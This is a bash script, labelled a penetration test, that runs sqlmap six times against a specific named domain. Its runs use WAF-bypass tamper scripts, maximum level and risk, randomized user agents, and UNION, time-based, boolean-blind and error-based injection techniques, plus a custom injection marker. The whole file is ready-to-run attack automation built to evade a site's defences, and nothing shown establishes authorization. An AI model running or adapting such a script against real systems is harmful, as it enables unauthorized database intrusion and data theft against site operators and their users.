#!/bin/bash

# Advanced SQLMap Testing Script with WAF Bypass
# Team B - Panama8888b Penetration Test

TARGET_URL="https://member.panama8888b.com/public/js/v2/app.js?v=25.1"
OUTPUT_DIR="./sqlmap_results"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

mkdir -p "$OUTPUT_DIR"

echo -e "${GREEN}[+] Advanced SQLMap Testing with WAF Bypass${NC}"
echo -e "${GREEN}[+] Target: $TARGET_URL${NC}"
echo "=================================================="

# Test 1: Basic test with tamper scripts
echo -e "${YELLOW}[*] Test 1: Using tamper scripts for WAF bypass${NC}"
sqlmap -u "$TARGET_URL" \
       --batch \
       --level=5 \
       --risk=3 \
       --dbms=mssql \
       --tamper=space2comment,charencode,randomcase \
       --random-agent \
       --delay=2 \
       --timeout=30 \
       --retries=3 \
       --output-dir="$OUTPUT_DIR/test1"

# Test 2: Manual payload injection
echo -e "${YELLOW}[*] Test 2: Manual payload with UNION technique${NC}"
sqlmap -u "$TARGET_URL" \
       --batch \
       --technique=U \
       --union-cols=1-10 \
       --dbms=mssql \
       --tamper=space2comment \
       --random-agent \
       --output-dir="$OUTPUT_DIR/test2"

# Test 3: Time-based with heavy delay
echo -e "${YELLOW}[*] Test 3: Time-based with custom delay${NC}"
sqlmap -u "$TARGET_URL" \
       --batch \
       --technique=T \
       --time-sec=10 \
       --dbms=mssql \
       --tamper=space2comment,charencode \
       --random-agent \
       --output-dir="$OUTPUT_DIR/test3"

# Test 4: Boolean-based blind
echo -e "${YELLOW}[*] Test 4: Boolean-based blind injection${NC}"
sqlmap -u "$TARGET_URL" \
       --batch \
       --technique=B \
       --dbms=mssql \
       --tamper=space2comment,between,randomcase \
       --random-agent \
       --output-dir="$OUTPUT_DIR/test4"

# Test 5: Error-based injection
echo -e "${YELLOW}[*] Test 5: Error-based injection${NC}"
sqlmap -u "$TARGET_URL" \
       --batch \
       --technique=E \
       --dbms=mssql \
       --tamper=space2comment \
       --random-agent \
       --output-dir="$OUTPUT_DIR/test5"

# Test 6: Custom injection point
echo -e "${YELLOW}[*] Test 6: Testing with custom injection markers${NC}"
sqlmap -u "https://member.panama8888b.com/public/js/v2/app.js?v=25.1*" \
       --batch \
       --level=5 \
       --risk=3 \
       --dbms=mssql \
       --tamper=space2comment,charencode,randomcase,between \
       --random-agent \
       --output-dir="$OUTPUT_DIR/test6"

echo -e "${GREEN}[+] All tests completed. Check results in $OUTPUT_DIR${NC}"